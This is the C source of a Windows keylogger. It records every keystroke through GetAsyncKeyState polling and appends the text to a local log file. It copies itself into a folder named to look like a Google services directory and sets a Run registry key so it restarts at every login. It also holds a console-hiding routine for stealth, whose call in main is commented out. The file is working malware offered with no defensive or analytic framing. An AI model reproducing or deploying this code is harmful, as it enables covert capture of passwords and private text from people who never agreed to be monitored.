#include "keylogger.h"

int shiftPressed = 0;
int altPressed = 0;
int ctrlPressed = 0;

void logKey(const char *input) {
    FILE *file = fopen(LOGFILE, "a");
    if (file) {
        fputs(input, file);
        fclose(file);
    }
}

int handleSpecialKeys(int key) {
    switch (key) {
        case VK_SPACE:      logKey(" "); return 1;
        case VK_RETURN:     logKey("\n"); return 1;
        case VK_BACK:       logKey("[BACKSPACE]"); return 1;
        case VK_TAB:        logKey("[TAB]"); return 1;
        case VK_CAPITAL:    logKey("[CAPS_LOCK]"); return 1;
        case VK_UP:         logKey("[UP_ARROW]"); return 1;
        case VK_DOWN:       logKey("[DOWN_ARROW]"); return 1;
        case VK_LEFT:       logKey("[LEFT_ARROW]"); return 1;
        case VK_RIGHT:      logKey("[RIGHT_ARROW]"); return 1;
        case VK_CONTROL:    
            if (!ctrlPressed) { 
                logKey("[CTRL]"); 
                ctrlPressed = 1; 
            } 
            return 1;
        case VK_MENU:       
            if (!altPressed) { 
                logKey("[ALT]"); 
                altPressed = 1; 
            } 
            return 1;
        case VK_SHIFT:      
            shiftPressed = 1; 
            return 1;
        default: 
            return 0;
    }
}

char mapWithShift(int key) {
    switch (key) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PLUS:  return '+';
        case VK_OEM_4:     return '{';
        case VK_OEM_6:     return '}';
        case VK_OEM_5:     return '|';
        case VK_OEM_1:     return ':';
        case VK_OEM_7:     return '\"';
        case VK_OEM_COMMA: return '<';
        case VK_OEM_PERIOD: return '>';
        case VK_OEM_2:     return '?';
        case VK_OEM_3:     return '~';
        default:           return (char)toupper(key);
    }
}

void handleKeyPress(int key) {
    char keyChar[3] = {0};

    // Handle special keys:
    if (handleSpecialKeys(key))
        return;

    // Handle letters:
    if (key >= 'A' && key <= 'Z') {
        int capsLockActive = GetKeyState(VK_CAPITAL) & CAPSLOCK_MASK;
        int upper = shiftPressed ^ capsLockActive;
        keyChar[0] = upper ? (char)key : (char)(key + 32);
    }
    // Handle digits:
    else if (key >= '0' && key <= '9') {
        keyChar[0] = shiftPressed ? mapWithShift(key) : (char)key;
    }
    // Handle symbols:
    else {
        switch (key) {
            case VK_OEM_MINUS:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_MINUS) : '-';
                break;
            case VK_OEM_PLUS:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_PLUS) : '=';
                break;
            case VK_OEM_4:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_4) : '[';
                break;
            case VK_OEM_6:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_6) : ']';
                break;
            case VK_OEM_5:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_5) : '\\';
                break;
            case VK_OEM_1:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_1) : ';';
                break;
            case VK_OEM_7:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_7) : '\'';
                break;
            case VK_OEM_COMMA:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_COMMA) : ',';
                break;
            case VK_OEM_PERIOD:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_PERIOD) : '.';
                break;
            case VK_OEM_2:
                keyChar[0] = shiftPressed ? mapWithShift(VK_OEM_2) : '/';
                break;
            default:
                if (isprint(key))
                    keyChar[0] = (char)key;
                break;
        }
    }

    if (keyChar[0] != 0)
        logKey(keyChar);
}

void handleKeyRelease(int key) {
    if (key == VK_SHIFT)
        shiftPressed = 0;
    if (key == VK_MENU)
        altPressed = 0;
    if (key == VK_CONTROL)
        ctrlPressed = 0;
}

void create_directory(char *targetPath) {
    struct stat st = {0};
    
    if (stat(targetPath, &st) == -1) {
        if (_mkdir(targetPath) == 0) {
            printf("Directory created successfully: %s\n", targetPath);
        } else {
            perror("Failed to create directory");
        }
    } else {
        printf("Directory already exists: %s\n", targetPath);
    }
}

// Function to copy the executable to AppData\Roaming
void copyToSystemLocation(char *targetPath) {
    char username[256];
    DWORD username_len = sizeof(username);

    // Get the current username
    if (!GetUserName(username, &username_len)) {
        printf("Failed to get username. Error code: %lu\n", GetLastError());
        return;
    }

   

    // Construct target path
    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services", username) >= MAX_PATH) {
        printf("Path length exceeds MAX_PATH limit.\n");
        return;
    }

    create_directory(targetPath);

    // Construct target path
    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWFILE) >= MAX_PATH) {
        printf("Path length exceeds MAX_PATH limit.\n");
        return;
    }

    // Copy the file
    if (!CopyFile(OLDFILE, targetPath, FALSE)) {
        DWORD dwError = GetLastError();
        printf("Error copying file. Error code: %lu\n", dwError);
    } else {
        printf("File copied successfully to: %s\n", targetPath);
    }
}

// Function to set registry persistence for the copied file
void setRegistryPersistence(const char *targetPath) {
    HKEY hKey;

    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, REGISTERY_NAME, 0, REG_SZ, (LPBYTE)targetPath, (DWORD)(strlen(targetPath) + 1));
        RegCloseKey(hKey);
        printf("Registry persistence set for: %s\n", targetPath);
    } else {
        printf("Failed to open registry key. Error code: %lu\n", GetLastError());
    }
}

// Main persistence function
void persistence() {
    char targetPath[MAX_PATH];
    copyToSystemLocation(targetPath);  // Copy itself to AppData\Roaming
    setRegistryPersistence(targetPath); // Set registry to point to copied location
}

// Function to hide the console window
void hideConsole() {
    HWND stealth;
    stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);
}

int main() {
    //hideConsole();  // Hide the console
    persistence();

    int keyStates[256] = {0};

    while (1) {
        Sleep(10);
        for (int key = 8; key < 256; key++) {
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & KEY_PRESSED) {
                if (!keyStates[key]) {
                    handleKeyPress(key);
                    keyStates[key] = 1;
                }
            } else {
                if (keyStates[key]) {
                    handleKeyRelease(key);
                    keyStates[key] = 0;
                }
            }
        }
    }
    return 0;
}
